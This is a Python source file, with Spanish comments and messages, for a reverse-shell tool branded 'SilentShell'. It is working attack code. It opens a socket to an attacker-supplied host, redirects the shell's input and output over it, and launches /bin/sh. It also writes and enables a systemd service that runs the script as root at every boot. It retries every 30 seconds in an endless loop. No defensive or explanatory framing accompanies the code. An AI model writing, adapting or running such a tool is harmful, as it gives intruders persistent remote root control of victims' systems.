import os
import socket
import time
import subprocess
import logging

# Configuración de logging
logging.basicConfig(filename='/var/log/silentshell.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

RHOST = "YOUR_IP"
RPORT = PORT

ASCII_ART = r"""
  /$$$$$$  /$$ /$$                       /$$      /$$$$$$  /$$                 /$$ /$$
 /$$__  $$|__/| $$                      | $$     /$$__  $$| $$                | $$| $$
| $$  \__/ /$$| $$  /$$$$$$  /$$$$$$$  /$$$$$$  | $$  \__/| $$$$$$$   /$$$$$$ | $$| $$
|  $$$$$$ | $$| $$ /$$__  $$| $$__  $$|_  $$_/  |  $$$$$$ | $$__  $$ /$$__  $$| $$| $$
 \____  $$| $$| $$| $$$$$$$$| $$  \ $$  | $$     \____  $$| $$  \ $$| $$$$$$$$| $$| $$
 /$$  \ $$| $$| $$| $$_____/| $$  | $$  | $$ /$$ /$$  \ $$| $$  | $$| $$_____/| $$| $$
|  $$$$$$/| $$| $$|  $$$$$$$| $$  | $$  |  $$$$/|  $$$$$$/| $$  | $$|  $$$$$$$| $$| $$
 \______/ |__/|__/ \_______/|__/  |__/   \___/   \______/ |__/  |__/ \_______/|__/|__/
"""

def print_red(message):
    """Imprime un mensaje en rojo."""
    print(f"\033[91m{message}\033[0m")

def limpiar_terminal():
    """Limpia la terminal y muestra el ASCII art."""
    os.system('clear' if os.name != 'nt' else 'cls')
    print(ASCII_ART)

def validar_parametros():
    """Valida los parámetros RHOST y RPORT."""
    if not isinstance(RHOST, str) or not RHOST:
        raise ValueError("RHOST debe ser una cadena no vacía")
    if not isinstance(RPORT, int) or RPORT <= 0 or RPORT > 65535:
        raise ValueError("RPORT debe ser un entero entre 1 y 65535")

def ejecutar_revshell():
    validar_parametros()
    try:
        s = socket.socket()
        s.connect((RHOST, RPORT))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh"])
        logging.info("Conexión establecida con éxito")
    except Exception as e:
        print_red(f"Error en la conexión: {e}")
        logging.error(f"Error en la conexión: {e}")
    finally:
        s.close()

def configurar_inicio():
    script_path = os.path.realpath(__file__)
    service_content = f"""[Unit]
Description=Revershell Script
After=network.target

[Service]
ExecStart=/usr/bin/python3 {script_path}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
"""
    service_path = "/etc/systemd/system/revshell.service"
    
    try:
        with open(service_path, 'w') as service_file:
            service_file.write(service_content)
        
        subprocess.run(["sudo", "systemctl", "daemon-reload"])
        subprocess.run(["sudo", "systemctl", "enable", "revshell.service"])
        subprocess.run(["sudo", "systemctl", "start", "revshell.service"])
        
        print_red("El script ha sido configurado para ejecutarse al inicio de Linux.")
        logging.info("Servicio configurado para ejecutarse al inicio")
    except Exception as e:
        print_red(f"No se pudo configurar el inicio en Linux: {e}")
        logging.error(f"No se pudo configurar el inicio en Linux: {e}")

def main():
    while True:
        ejecutar_revshell()
        time.sleep(30)

if __name__ == "__main__":
    limpiar_terminal()
    configurar_inicio()
    main()
